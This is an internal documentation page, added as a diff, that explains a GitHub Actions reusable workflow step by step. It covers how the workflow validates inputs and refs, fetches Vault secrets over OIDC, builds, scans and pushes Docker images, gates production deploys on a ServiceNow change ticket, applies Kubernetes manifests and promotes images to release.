+This is the whole `build-deploy` job on one page. Diamonds are `if:` conditions; red boxes are hard failures.
+
+```mermaid
+flowchart TD
+    S(["Start: workflow_call"]) --> I1["Initialize&lt;br/>chown workspace, compute DEPLOY_WINDOW_DATE_HOUR"]
+    I1 --> I2{"ENVIRONMENT in dev, test, prod?"}
+    I2 -- no --> F1["❌ Invalid ENVIRONMENT"]
+    I2 -- yes --> I3{"test/prod AND ref != main?"}
+    I3 -- yes --> F2["❌ test/prod only from main"]
+    I3 -- no --> I4["Print + Resolve checkout ref&lt;br/>block PR refs, validate name"]
+    I4 -->|invalid| F3["❌ Invalid / PR / qualified ref"]
+    I4 --> I5["actions/checkout@v4&lt;br/>fetch-depth 1, no persisted creds"]
+    I5 --> I6["Base64 the UHG proxy CA bundle"]
+    I6 --> V["Vault: ~30 values + 5 secrets&lt;br/>(OIDC → JWT login)"]
+    V --> T1["Set SN_CHANGE_TICKET&lt;br/>input or Vault, validated"]
+    T1 --> T2{"prod AND ticket empty?"}
+    T2 -- yes --> F4["❌ Change ticket required"]
+    T2 -- no --> U{"actor in DEPLOYERS list&lt;br/>(or list = *)?"}
+    U -- no --> F5["❌ Not an allowed deployer"]
+    U -- yes --> SAN["Validate BUILD_TYPE · DOCKER_IMAGE_TAG&lt;br/>Sanitise repo name, artifact type, JFrog URLs"]
+    SAN --> IMG{"Image build type?&lt;br/>(not Flyway, not MavenJAR)"}
+    IMG -- yes --> N1["Compute image suffix&lt;br/>dev: …/repo-dev · test/prod: …/repo"]
+    N1 --> N2["Compute central + edge image URLs"]
+    IMG -- no --> TOOL
+    N2 --> TOOL["Setup: JDK? · JFrog log level · JFrog connection? · Maven?"]
+    TOOL --> MB{"dev/test AND Maven/MavenJAR?"}
+    MB -- yes --> MB1["epl-maven build-scan@v3&lt;br/>mvn … -Drevision=R‹run›.‹attempt›-‹sha›&lt;br/>+ Sonar"]
+    MB -- no --> DB
+    MB1 --> DB{"dev/test AND image type?"}
+    DB -- yes --> DB1["PRM: Prisma creds&lt;br/>docker login central + edge&lt;br/>build → Xray + Prisma scan → push"]
+    DB -- no --> SNV
+    DB1 --> SNV{"prod?"}
+    SNV -- yes --> SNV1["ServiceNow: validate change window"]
+    SNV1 -->|rejected| F6["❌ ServiceNow validation failed"]
+    SNV1 --> OUT
+    SNV -- no --> OUT["Set job outputs&lt;br/>run-promote = prod AND image type"]
+    OUT --> DEP{"Image type?"}
+    DEP -- yes --> D1["sed placeholders in K8S_DEPLOY_FILE"] --> D2["epl-kubectl apply"]
+    DEP -- no --> FW
+    D2 --> FW{"Flyway?"}
+    FW -- yes --> FW1["epl-maven build-scan@v1&lt;br/>MAVEN_FLYWAY_MIGRATE_COMMAND"]
+    FW -- no --> EM
+    FW1 --> EM{"test or prod?"}
+    EM -- yes --> EM1["epl-send-mail"]
+    EM -- no --> J1
+    EM1 --> J1(["Job 1 done"])
+    J1 --> P{"run-promote == true?"}
+    P -- yes --> P1["Job 2: privileged promote-docker-image@v3&lt;br/>promotion-type: release"]
+    P -- no --> Z(["Finished"])
+    P1 --> Z
+    classDef fail fill:#fde8e8,stroke:#b42318,color:#7a1b12
+    class F1,F2,F3,F4,F5,F6 fail
+```
+
+### 8.1 Which steps run? (decision matrix)
+
+"Image" means BUILD_TYPE is `Maven`, `Docker`, or `NodeJS`. ✅ = runs, — = skipped.
+
+| # | Step (line) | dev/test · Maven | dev/test · NodeJS/Docker | prod · Maven/NodeJS/Docker | dev/test · MavenJAR | prod · MavenJAR | Flyway (any env) |
+|---|---|:-:|:-:|:-:|:-:|:-:|:-:|
+| 1 | Initialize (L64) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 2 | Validate ENVIRONMENT (L70) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 3 | Branch/env check (L86) | test only | test only | ✅ | test only | ✅ | test/prod |
+| 4-6 | Print ref · Resolve ref · Checkout (L92-161) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 7-8 | CA bundle · Vault (L163-214) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 9 | Set SN_CHANGE_TICKET (L216) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 10 | Prod ticket check (L247) | — | — | ✅ | — | ✅ | prod |
+| 11 | Deployer check (L259) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 12-14 | Validate BUILD_TYPE · tag · sanitise (L265-357) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 15 | Dev image suffix (L359) | dev | dev | — | — | — | — |
+| 16 | Test/prod image suffix (L367) | test | test | ✅ | — | — | — |
+| 17 | Image URLs (L375) | ✅ | ✅ | ✅ | — | — | — |
+| 18 | Set up JDK (L384) | ✅ | — | — | ✅ | — | ✅ |
+| 19 | JFrog CLI log level (L391) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 20 | Configure JFrog SaaS (L408) | ✅ | ✅ | — | ✅ | — | ✅ |
+| 21 | Set up Maven (L418) | ✅ | — | — | ✅ | — | ✅ |
+| 22 | Maven build + Sonar (L427) | ✅ | — | — | ✅ | — | — |
+| 23 | PRM Prisma secrets (L442) | ✅ | ✅ | — | — | — | — |
+| 24-26 | Docker logins ×3 (L452-474) | ✅ | ✅ | — | — | — | — |
+| 27 | Docker build/scan/push (L477) | ✅ | ✅ | — | — | — | — |
+| 28 | ServiceNow validation (L508) | — | — | ✅ | — | ✅ | prod |
+| 29 | Set outputs (L517) | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
+| 30-31 | Patch K8s file · kubectl apply (L537-562) | ✅ | ✅ | ✅ | — | — | — |
+| 32 | Flyway migrate (L565) | — | — | — | — | — | ✅ |
+| 33 | Send email (L579) | test | test | ✅ | test | ✅ | test/prod |
+| J2 | Promote to release (L603) | — | — | ✅ | — | — | — |
+
+> 🔑 **Prod never builds.** In prod the pipeline only *deploys* an image tag that a **test** run already built and pushed, then promotes it. Test and prod share the same image path (no `-test` suffix), which is what makes this "build once, deploy many" approach work. See [§14](#14-docker-image-lifecycle--promotion).
+
+---
+
+## 9. Step-by-step walkthrough (every step)
+
+Each step below lists **when it runs**, **what it reads**, **what it writes**, and **why it exists**.
+
+### Phase A — Bootstrap &amp; guardrails
+
+#### A1. `Initialize` (L64-68), always
+
+```bash
+sudo chown -R "$USER:$USER" "$GITHUB_WORKSPACE"
+deploy_window_date_hour="$(TZ=":US/Central" date +"%m%d%Y_%H")"
+printf 'DEPLOY_WINDOW_DATE_HOUR=%s\n' "$deploy_window_date_hour" >> "$GITHUB_ENV"
+```
+
+- **Why `chown`?** On self-hosted runners, earlier Docker-based jobs can leave root-owned files in the workspace. Then `actions/checkout` cannot clean them (see actions/checkout issue #211, linked in the comment). Taking ownership first prevents "permission denied" errors.
+- **Writes:** `DEPLOY_WINDOW_DATE_HOUR`, e.g. `11252026_14` (25 Nov 2026, 2 pm Central). This was meant for the "approved test deploy window" check at L253-257, which is **commented out**, so today the value is unused.
+
+#### A2. `Validate and set safe environment input` (L70-84), always
+
+- **Reads:** `inputs.ENVIRONMENT` (via `ENVIRONMENT_INPUT`).
+- **Does:** strips CR/LF, then an **allow-list** `case`: only `dev`, `test`, `prod`.
+- **Writes:** `SAFE_ENVIRONMENT`. Later steps use this variable, never the raw input, wherever the value is used to build a **path** (Vault paths `kv/data/${SAFE_ENVIRONMENT}`).
+- **Fails with:** `FATAL ERROR - Invalid ENVIRONMENT input: &lt;value>`.
+
+#### A3. `Branch name and environment check` (L86-90), test/prod only
+
+```yaml
+if: ${{ ((inputs.ENVIRONMENT == 'test') || (inputs.ENVIRONMENT == 'prod')) &amp;&amp; (github.ref != 'refs/heads/main') }}
+```
+
+- **Why:** test and prod must only receive reviewed code from `main`. `github.ref` is the **caller's** ref, which is whatever branch the engineer picked in the "Use workflow from" dropdown.
+- **Fails with:** `FATAL ERROR - test or prod environment deployment should be done only from main branch!`
+
+#### A4. `Print branch being checked out` (L92-105), always
+
+Informational. It repeats the ref-selection logic and **echoes** the result to the log, so humans can see what will be checked out. It writes nothing.
+
+#### A5. `Resolve checkout ref` (L107-154), always
+
+This is the most security-sensitive shell block. It decides which branch to check out and refuses anything suspicious.
+
+```mermaid
+flowchart TD
+    A{"Scheduled = YES&lt;br/>AND BRANCH given?"} -- yes --> B{"ENV is test or prod?"}
+    B -- yes --> F1["❌ BRANCH override not allowed for test/prod"]
+    B -- no --> C["ref = BRANCH"]
+    A -- no --> D["ref = github.ref_name"]
+    C --> E["strip CR/LF"]
+    D --> E
+    E --> G{"empty?"} -- yes --> F2["❌ empty after sanitisation"]
+    G -- no --> H{"looks like a PR ref?&lt;br/>refs/pull/*, pull/*, pr/*, */merge, */head"}
+    H -- yes --> F3["❌ PR refs not allowed"]
+    H -- no --> I{"starts with refs/heads/ ?"}
+    I -- yes --> J["strip refs/heads/"]
+    I -- no --> K{"starts with refs/ ?"}
+    K -- yes --> F4["❌ fully-qualified refs not allowed"]
+    K -- no --> L
+    J --> L{"git check-ref-format --branch OK?"}
+    L -- no --> F5["❌ Invalid checkout ref"]
+    L -- yes --> M["CHECKOUT_REF → GITHUB_ENV"]
+```
+
+- **Why block PR refs?** This job holds production secrets (`KUBE_CONFIG`, DB password). Checking out `refs/pull/123/merge` would run **untrusted contributor code** with those secrets.
+- **Why `git check-ref-format --branch`?** It applies Git's own rules for branch names: no spaces, no `..`, no `~^:?*[`, no leading `-`, and so on. That blocks option injection and path tricks.
+- **Example:** `refs/heads/feature/x` → `feature/x` ✅ · `refs/tags/v1` → ❌ · `-oops` → ❌.
+
+#### A6. `Checkout code` (L156-161), always
+
+```yaml
+uses: actions/checkout@v4
+with:
+  ref: ${{ env.CHECKOUT_REF }}
+  fetch-depth: 1            # shallow: only the latest commit, which is faster
+  persist-credentials: false  # do NOT leave the GITHUB_TOKEN in .git/config
+```
+
+`persist-credentials: false` means later steps (Docker builds, Maven plugins, scripts) cannot read a Git token from `.git/config`. Since the code being built might be compromised, it should not hold credentials.
+
+> The checked-out repository is the **caller** (UI or API). Its `Dockerfile` and `deployment.yaml` are what get built and applied.
+
+### Phase B — Secrets
+
+#### B1. `Fetch UHG CA information` (L163-166), always
+
+```bash
+uhg_ca_base64="$(base64 -w 0 /usr/local/share/ca-certificates/Optum_ProxyMITM_Bundle.crt)"
+printf 'UHG_CA_BASE64=%s\n' "$uhg_ca_base64" >> "$GITHUB_ENV"
+```
+
+UHG inspects outbound TLS through a proxy that re-signs certificates (a "man-in-the-middle" proxy). Tools must trust that proxy's CA, or every HTTPS call fails with *"self-signed certificate in chain"*. The bundle is base64-encoded (`-w 0` = one line, so it is safe for `$GITHUB_ENV`) and passed to the Vault action.
+
+#### B2. `Get Hashi Vault Secrets` (L168-214), always
+
+```yaml
+uses: optum-rx-tech-ops/devsecops-custom-hashivault-action@v3
+with:
+  url: https://pam-dev.uhc.com
+  caCertificate: ${{ env.UHG_CA_BASE64 }}
+  method: jwt                               # log in with GitHub's OIDC token
+  jwtGithubAudience: https://pam-dev.uhc.com
+  role: reusable-workflows                  # Vault role bound to this workflow's claims
+  namespace: OPTUM/APP/CECT/STAGE
+  values: |   # exported as plain env vars (visible in logs if echoed)
+    kv/data/ci-cd aide-id | AIDE_ID ;
+    kv/data/${{ env.SAFE_ENVIRONMENT }} k8s-namespace | K8S_NAMESPACE ;
+    ...
+  secrets: |  # exported as env vars AND masked (*** in logs)
+    kv/data/${{ env.SAFE_ENVIRONMENT }} kube-config | KUBE_CONFIG ;
+    ...
+```
+
+Line format: `&lt;kv path> &lt;key> | &lt;ENV_VAR_NAME> ;`
+
+```mermaid
+sequenceDiagram
+    autonumber
+    participant Step as Vault step (runner)
+    participant OIDC as GitHub OIDC
+    participant V as Vault pam-dev.uhc.com
+    Step->>OIDC: Request JWT (aud = https://pam-dev.uhc.com)
+    OIDC-->>Step: Signed JWT (repo, ref, workflow, actor claims)
+    Step->>V: POST auth/jwt/login role=reusable-workflows, jwt=...
+    V->>V: Verify signature + bound claims for role
+    V-->>Step: Short-lived Vault token
+    loop each "path key | VAR" line
+      Step->>V: GET kv/data/ci-cd or kv/data/dev|test|prod
+      V-->>Step: value
+      Step->>Step: export VAR (mask if listed under secrets)
+    end
+```
+
+Two kinds of Vault path:
+
+| Path | Scope | Examples |
+|---|---|---|
+| `kv/data/ci-cd` | **Shared** across all environments | JFrog URLs, Java/Maven versions, Sonar settings, ServiceNow user |
+| `kv/data/&lt;dev\|test\|prod>` | **Per environment** (chosen by `SAFE_ENVIRONMENT`) | `kube-config`, `k8s-namespace`, memory limits, DB creds, **deployer list** |
+
+The full list is in [Appendix A](#appendix-a--vault-key-catalogue).
+
+> 🛡️ **No long-lived secret is stored in GitHub.** The only "credential" is GitHub's signed statement of *who is running*, and Vault decides what that identity may read.
+
+### Phase C — Change management &amp; authorisation
+
+#### C1. `Set SN_CHANGE_TICKET value` (L216-245), always
+
+```mermaid
+flowchart LR
+    A["DEPLOY_TRIGGERED_BY_SCHEDULE"] --> B{"YES or NO?"}
+    B -- other --> F["❌ Invalid flag"]
+    B -- YES --> C["ticket = Vault servicenow-change-request"]
+    B -- NO --> D["ticket = inputs.SN_CHANGE_TICKET"]
+    C --> E{"non-empty AND not ^[A-Za-z0-9_-]+$ ?"}
+    D --> E
+    E -- yes --> G["❌ Invalid SN_CHANGE_TICKET"]
+    E -- no --> H["SN_CHANGE_TICKET → GITHUB_ENV"]
+```
+
+A scheduled (unattended) run cannot type a ticket number, so it reads a pre-approved one from Vault. A manual run uses whatever the engineer typed. Uses function [`sanitize_no_newlines`](#101-sanitize_no_newlines).
+
+#### C2. `Prod change ticket not null check` (L247-251), prod only
+
+If `ENVIRONMENT == 'prod'` and `SN_CHANGE_TICKET` is empty, the run fails immediately. That is cheaper than discovering it at the ServiceNow step 20 steps later.
+
+#### C3. *(commented out)* `Test approved deploy window date hour check` (L253-257)
+
+Would have required `DEPLOY_WINDOW_DATE_HOUR` (e.g. `11252026_14`) to match the Vault value `approved-test-deploy-window-date-hour`, so test deploys could only happen in an approved hour. It is disabled; re-enable it only if the team wants that rule back.
+
+#### C4. `Deployement user check` (L259-263), always
+
+```yaml
+if: ${{ (env.DEPLOYERS_GHEC_USER_ID_LIST != '*') &amp;&amp; contains(env.DEPLOYERS_GHEC_USER_ID_LIST, github.actor) != true }}
+```
+
+- `DEPLOYERS_GHEC_USER_ID_LIST` comes from Vault, **per environment**, so prod can have a shorter list than dev.
+- `*` means "anyone with repo access may deploy" (typical for dev).
+- ⚠️ `contains()` on a **string** is a *substring* match. See [§18](#18-known-issues-tech-debt--gotchas) #4.
+
+### Phase D — Input validation &amp; sanitisation
+
+#### D1. `Validate and set safe BUILD_TYPE input` (L265-278)
+
+Allow-list: `Maven|MavenJAR|Flyway|Docker|NodeJS` → writes `SAFE_BUILD_TYPE`.
+
+#### D2. `Validate and sanitize DOCKER_IMAGE_TAG input` (L280-293)
+
+Empty is allowed; otherwise the tag must match `^[A-Za-z0-9._-]+$`. Writes `VALIDATED_DOCKER_IMAGE_TAG`.
+
+| Tag typed | Result |
+|---|---|
+| `R26.11.25` | ✅ |
+| `1.0.3-hotfix_2` | ✅ |
+| `latest` | ✅ (allowed, but avoid it: not reproducible) |
+| `v1:2` | ❌ (`:` would break `image:tag`) |
+| `a b` | ❌ |
+
+#### D3. `Sanitize workflow inputs for shell usage` (L295-357)
+
+This step defines two functions, [`sanitize_env_value`](#102-sanitize_env_value) and [`require_pattern`](#103-require_pattern), and runs six values through both:
+
+| Raw input | Source | Sanitiser → pattern | Writes |
+|---|---|---|---|
+| `github.event.repository.name` | caller repo | `^[A-Za-z0-9._-]+$` | `SAFE_REPOSITORY_NAME` |
+| `inputs.ARTIFACT_TYPE` | caller | `^[A-Za-z0-9._-]+$` | `SAFE_ARTIFACT_TYPE` |
+| `JF_SAAS_DOCKER_NAMESPACE` | Vault | `^[A-Za-z0-9._/-]+$` | `SAFE_JF_SAAS_DOCKER_NAMESPACE` |
+| `JF_SAAS_CENTRAL_DOCKER_BASE_URL` | Vault | `^[A-Za-z0-9._:/-]+$` | `SAFE_JF_SAAS_CENTRAL_DOCKER_BASE_URL` |
+| `JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` | Vault | `^[A-Za-z0-9._:/-]+$` | `SAFE_JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` |
+| `VALIDATED_DOCKER_IMAGE_TAG` | D2 | `^[A-Za-z0-9._-]+$` if non-empty | `SAFE_DOCKER_IMAGE_TAG` |
+
+> Even **Vault** values are sanitised. That is *defence in depth*: if someone mis-edits Vault, the pipeline fails loudly instead of injecting garbage.
+
+### Phase E — Image naming
+
+#### E1/E2. Image suffix (L359-373), image build types only
+
+| Env | `DOCKER_IMG_SUFFIX_NO_NAMESPACE` | `DOCKER_IMAGE_SUFFIX` |
+|---|---|---|
+| dev | `&lt;repo>/&lt;artifact>/&lt;repo>-dev` | `&lt;namespace>/&lt;repo>/&lt;artifact>/&lt;repo>-dev` |
+| test, prod | `&lt;repo>/&lt;artifact>/&lt;repo>` | `&lt;namespace>/&lt;repo>/&lt;artifact>/&lt;repo>` |
+
+#### E3. `Set Environment Variables` (L375-381)
+
+```text
+JF_SAAS_CENTRAL_DOCKER_IMAGE_URL = &lt;central-base>/&lt;DOCKER_IMAGE_SUFFIX>:&lt;tag>   ← where the image is PUSHED
+JF_SAAS_EDGEINT_DOCKER_IMAGE_URL = &lt;edge-base>/&lt;DOCKER_IMAGE_SUFFIX>:&lt;tag>      ← what Kubernetes PULLS
+```
+
+**Worked example:** UI repo, `ENVIRONMENT=dev`, tag `R26.11.25`:
+
+```text
+SAFE_REPOSITORY_NAME = claims-extract-comparison-tool-ui-2-0
+SAFE_ARTIFACT_TYPE   = ui
+DOCKER_IMG_SUFFIX_NO_NAMESPACE = claims-extract-comparison-tool-ui-2-0/ui/claims-extract-comparison-tool-ui-2-0-dev
+JF_SAAS_EDGEINT_DOCKER_IMAGE_URL =
+  edgeinternal1uhg.uhg.com/&lt;namespace>/claims-extract-comparison-tool-ui-2-0/ui/claims-extract-comparison-tool-ui-2-0-dev:R26.11.25
+```
+
+*(`&lt;namespace>` and the central host come from Vault. The edge host shown is the one the Dockerfiles use.)*
+
+```mermaid
+flowchart LR
+    A["central or edge base URL&lt;br/>(Vault)"] --- B["/ namespace&lt;br/>(Vault)"] --- C["/ repo name&lt;br/>(caller)"] --- D["/ artifact type&lt;br/>ui or api"] --- E["/ repo name&lt;br/>+ '-dev' in dev only"] --- F[": tag&lt;br/>(input)"]
+```
+
+### Phase F — Toolchain setup
+
+| Step | Line | Runs when | What it does |
+|---|---|---|---|
+| **Set up JDK** | L384 | Flyway, or dev/test with Maven/MavenJAR | `actions/setup-java@v5` using Vault `JAVA_VERSION` + `JAVA_DISTRIBUTION`. |
+| **Set JFrog CLI Log Level** | L391 | always | Upper-cases Vault `jfrog-cli-loglevel`, allow-lists `ERROR\|WARN\|INFO\|DEBUG\|TRACE`, writes `JFROG_CLI_LOG_LEVEL` (the env var the JFrog CLI reads). Uses `shell: bash`. |
+| **Configure JFrog SaaS Connection** | L408 | Flyway, or **dev/test** (any type) | `epl-jf/configure-saas-connection@v4`: exchanges GitHub OIDC for a **JFrog access token**, configures the JFrog CLI, and sets up npm against Artifactory (`npm-setup: true`). Outputs: `access-token`, `oidc-subject`, `jfrog-build-name`, `jfrog-build-number`, `jfrog-docker-repository`. |
+| **Set up Maven** | L418 | same as JDK | `uhg-pipelines/setup-maven@v1`: downloads Maven `MAVEN_VERSION` from the Artifactory Maven-central mirror, authenticated with the JFrog token. |
+
+> Prod skips **Configure JFrog SaaS Connection**, so in prod `steps.jf-saas-setup.outputs.*` are empty. That is fine, because prod does not build or push anything.
+
+### Phase G — Build &amp; scan (dev/test only)
+
+#### G1. `Maven build and Quality Scan` (L427-438)
+
+```yaml
+uses: uhg-pipelines/epl-maven/build-scan@v3
+with:
+  maven-command: ${{ format('{0} -Drevision=R{1}.{2}-{3}', inputs.MAVEN_BUILD_COMMAND, github.run_number, github.run_attempt, github.sha) }}
+  enable-sonar: true
+  maven-deploy: false      # build the JAR, but do NOT publish it to Artifactory
+```
+
+Example final command for the API (run #57, first attempt):
+
+```text
+mvn clean install -Ddependency-check.skip=true -Drevision=R57.1-3f9c2e1d...
+```
+
+`-Drevision` feeds Maven's CI-friendly `${revision}` version, so every JAR is traceable to an exact run and commit. The resulting `target/*.jar` stays on the runner, and the API `Dockerfile` copies it in (`COPY ${JAR_FILE} cect-api.jar`) in step G3.
+
+#### G2. Registry access
+
+| Step | Line | Purpose |
+|---|---|---|
+| **Get PRM Prisma Secrets** | L442 | Reads `PRISMA_ACCESS_KEY_ID` / `PRISMA_ACCESS_KEY` from PRM (UHG-wide twistcli credentials). |
+| **Docker Login to JFrog SaaS central** | L452 | `docker login` to the central registry (push target), with the JFrog OIDC token. |
+| **Login to JFrog SaaS edge internal** | L460 | `docker login` to the sanitised edge registry, so base images (`FROM edgeinternal1uhg…`) can be pulled. |
+| **Login to JFrog SaaS edge internal** *(duplicate)* | L468 | Same as above, but uses the **unsanitised** `env. JF_SAAS_EDGEINT_UHG_DOCKER_BASE_URL` (note the stray space). Redundant; already removed on `main-uhg-only`. |
+
+#### G3. `Docker Build Scan And Push` (L477-506)
+
+```mermaid
+flowchart LR
+    A["Dockerfile&lt;br/>inputs.DOCKER_FILE"] --> B["docker build&lt;br/>build-args: DOCKER_BUILD_ARGS + Sonar args&lt;br/>secrets: jf-user, jf-token"]
+    B --> S["Scan + push&lt;br/>Prisma twistcli · JFrog Xray&lt;br/>push to JF_SAAS_CENTRAL_DOCKER_IMAGE_URL&lt;br/>publish build-info"]
+    S --> E{"all OK?"}
+    E -- no --> X["❌ step fails&lt;br/>later deploy steps never run"]
+    E -- yes --> F(["Image available in JFrog"])
+```
+
+The exact order of scan and push is internal to the EPL action. What matters for you: if a build, scan policy or push fails, this step fails, and the Kubernetes deploy steps after it are skipped.
+
+Key inputs:
+
+| Input | Value | Notes |
+|---|---|---|
+| `ask-id` | `AIDE_ID` (Vault) | Tags the image with the UHG application ID. |
+| `docker-dockerfile` | `inputs.DOCKER_FILE` | UI: `surfaces/cect-ui/Dockerfile`. The API caller passes nothing, so the EPL action's default is used; the API keeps its `Dockerfile` at the repository root. |
+| `docker-build-args` | `DOCKER_BUILD_ARGS` (Vault) + `SONAR_HOST_URL`, `CORE_SONAR_PROJECT_KEY`, `CORE_SONAR_PROJECT_NAME`, `CORE_SONAR_BRANCH` | On `main`, the project key/name reference **unset** env vars. See §18 #2. |
+| `docker-build-secrets` | `jf-user`, `jf-token` | Mounted as BuildKit secrets, **not** build args, so they never end up in image layers. The UI Dockerfile reads them with `RUN --mount=type=secret,id=jf-token,env=DOCKER_ER_TOKEN` to authenticate `npm clean-install`. |
+| `docker-tags` | `JF_SAAS_CENTRAL_DOCKER_IMAGE_URL` | Push target. |
+| `enable-xray`, `enable-prisma`, `docker-push` | `true` | Scan, then push. |
+
+### Phase H — Production gate
+
+#### H1. `Prod Service-now change ticket validation` (L508-515), prod only
+
+`epl-service-now/validate-change-window@v1` logs in to `optum.service-now.com` as `ORX_CECT_SN_USER` and checks that `SN_CHANGE_TICKET` exists, is **approved**, and that **now** is inside its scheduled window. If not, the run stops **before** anything touches the prod cluster.
+
+### Phase I — Outputs
+
+#### I1. `Set outputs for Docker promote to release child job` (L517-534), always
+
+```bash
+if [ "$SAFE_ENVIRONMENT_INPUT" = "prod" ] &amp;&amp; [ "$SAFE_BUILD_TYPE_INPUT" != "Flyway" ] &amp;&amp; [ "$SAFE_BUILD_TYPE_INPUT" != "MavenJAR" ]; then
+  printf 'run-promote-docker-image-to-release=%s\n' "true"  >> "$GITHUB_OUTPUT"
+else
+  printf 'run-promote-docker-image-to-release=%s\n' "false" >> "$GITHUB_OUTPUT"
+fi
+# + JF_SAAS_PROJECT_KEY, JF_SAAS_CENTRAL_DOCKER_BASE_URL, DOCKER_IMG_SUFFIX_NO_NAMESPACE, DOCKER_IMAGE_TAG
+```
+
+The `id: setoutputs` is what lets the job-level `outputs:` block (L56-61) reference `steps.setoutputs.outputs.*`.
+
+### Phase J — Deploy
+
+#### J1. `Pre-deploy update K8S deployment file` (L537-555), image types
+
+The caller repo contains a **template** Kubernetes manifest (the filename comes from Vault `k8s-deploy-file`, e.g. `deployment.yaml`) with placeholders. This step fills them in with `sed`, using [`escape_sed_replacement`](#104-escape_sed_replacement):
+
+| Placeholder | Replaced with | Example |
+|---|---|---|
+| `##sub-environment##` | `SAFE_ENVIRONMENT` | `dev` |
+| `##docker-image-url##` | `JF_SAAS_EDGEINT_DOCKER_IMAGE_URL` | `edgeinternal1uhg.uhg.com/…:R26.11.25` |
+| `##k8s-namespace##` | `K8S_NAMESPACE` (Vault, per env) | `cect-dev` |
+| `##k8s-api-memory-limits##` | `K8S_API_MEMORY_LIMITS` (Vault, per env) | `4Gi` |
+| `##k8s-api-memory-requests##` | `K8S_API_MEMORY_REQUESTS` (Vault, per env) | `2Gi` |
+
+*(Example values are illustrative; the real ones live in Vault.)*
+
+```mermaid
+flowchart LR
+    T["deployment.yaml (template)&lt;br/>name: cect-ui-«sub-environment»&lt;br/>image: «docker-image-url»"] -- "sed fills each placeholder" --> R["deployment.yaml (rendered)&lt;br/>name: cect-ui-dev&lt;br/>image: edgeinternal1uhg…:R26.11.25"]
+    R --> K["kubectl apply -f"]
+```
+
+Note that `sed` replaces only the **first** match on each line (no `/g` flag). That works for the current templates, where each placeholder appears at most once per line.
+
+What the UI template creates once rendered (from `claims-extract-comparison-tool-ui-2-0/deployment.yaml`):
+
+```mermaid
+flowchart TB
+    subgraph NS["namespace: K8S_NAMESPACE"]
+      SVC["Service cect-ui-service-ENV&lt;br/>ClusterIP :4000"]
+      HPA["HorizontalPodAutoscaler cect-ui-hpa-ENV&lt;br/>min 1 / max 1"]
+      DEP["Deployment cect-ui-ENV&lt;br/>RollingUpdate maxSurge 1 maxUnavailable 1"]
+      POD["Pod: node --max-old-space-size=950&lt;br/>server-lifecycle.js · port 4000&lt;br/>probes GET /health-check&lt;br/>runAsUser 65535"]
+      CM1[("ConfigMap cect-ui-config-map-ENV")]
+      CM2[("ConfigMap cect-shared-config-map-ENV")]
+      SEC[("Secret cect-shared-secrets-ENV")]
+      PULL[("imagePullSecret jfrog-saas-secret")]
+    end
+    SVC --> POD
+    HPA --> DEP --> POD
+    CM1 &amp; CM2 &amp; SEC -. envFrom .-> POD
+    PULL -. pulls image from edge .-> POD
+```
+
+The ConfigMaps, Secrets and the `jfrog-saas-secret` are **not** created by this pipeline. They are pre-provisioned (see the `cect-k8s-config` repo). If one is missing, pods fail to start even though the workflow is green.
+
+#### J2. `Deploy to kubernetes` (L557-562), image types
+
+```yaml
+uses: uhg-pipelines/epl-kubectl/apply@v1
+with:
+  kube-config: ${{ env.KUBE_CONFIG }}     # masked Vault secret, per environment
+  filename: ${{ env.K8S_DEPLOY_FILE }}
+```
+
+Because pods use `imagePullPolicy: Always`, re-applying the same tag still pulls the latest bytes for that tag.
+
+### Phase K — Database migration
+
+#### K1. `Flyway migrate` (L565-576), Flyway only
+
+Runs `MAVEN_FLYWAY_MIGRATE_COMMAND` (from Vault) through `epl-maven/build-scan@v1` with Sonar off. The Vault values `DATABASE_JDBC_URL`, `DATABASE_SCHEMA`, `DATABASE_USERNAME`, `DATABASE_PASSWORD`, `FLYWAY_BASELINE_ON_MIGRATE` and `FLYWAY_CLEAN_DISABLED` are already exported as env vars by the Vault step, so the Maven process can read them. No current caller offers `Flyway`.
+
+### Phase L — Notify
+
+#### L1. `Send email` (L579-601), test/prod
+
+`epl-send-mail@v1` sends "Production / Test Deployment Notification: &lt;repo>" with the environment, artifact type, tag and (prod only) change ticket, asking the team to run regression tests. The recipient is currently a **single hard-coded address** (L584). UHG mail DLs are internal-only (KB0038563, per the comment).
+
+### Phase M — Job 2: `promote-docker-image-to-release` (L603-613)
+
+```yaml
+promote-docker-image-to-release:
+  needs: build-deploy
+  if: needs.build-deploy.outputs.run-promote-docker-image-to-release == 'true'
+  uses: uhg-pipelines/privileged-workflows/.github/workflows/promote-docker-image.yaml@v3
+  secrets: inherit
+  with:
+    jfrog-project-key:        ${{ needs.build-deploy.outputs.jfrog-saas-project-key }}
+    jfrog-url:                'https://${{ needs.build-deploy.outputs.jfrog-saas-central-docker-base-url }}'
+    source-docker-image-name: ${{ needs.build-deploy.outputs.docker-img-suffix-no-namespace }}
+    source-docker-image-tag:  ${{ needs.build-deploy.outputs.docker-image-tag }}
+    promotion-type: release
+```
+
+This is a **nested reusable workflow** owned by the enterprise pipeline team. It holds elevated JFrog permissions (hence *privileged*) and copies or moves the image from the build repository into the **release** repository. That marks it as an officially released, retained artifact. It runs only after prod deployment succeeds.
+
+---
+
+## 10. Shell function reference (every function)
+
+The workflow defines **four** bash functions. Each one exists only inside the step that defines it.
+
+### 10.1 `sanitize_no_newlines`
+
+**Defined in:** `Set SN_CHANGE_TICKET value` (L222-224)
+
+```bash
+sanitize_no_newlines() {
+  printf '%s' "$1" | tr -d '\n\r'
+}
+```
+
+| | |
+|---|---|
+| **Purpose** | Remove every line-feed and carriage-return so a value cannot add extra lines to `$GITHUB_ENV`. |
+| **Input** | `$1`: any string |
+| **Output** | stdout: the string without `\n`/`\r` |
+| **Fails?** | Never |
+| **Why `printf '%s'` and not `echo`?** | `echo` interprets `-n`/`-e` and, in some shells, backslashes. `printf '%s'` prints the bytes exactly. |
+
+**Usage:**
+
+```bash
+safe_schedule_flag="$(sanitize_no_newlines "$DEPLOY_TRIGGERED_BY_SCHEDULE_INPUT")"
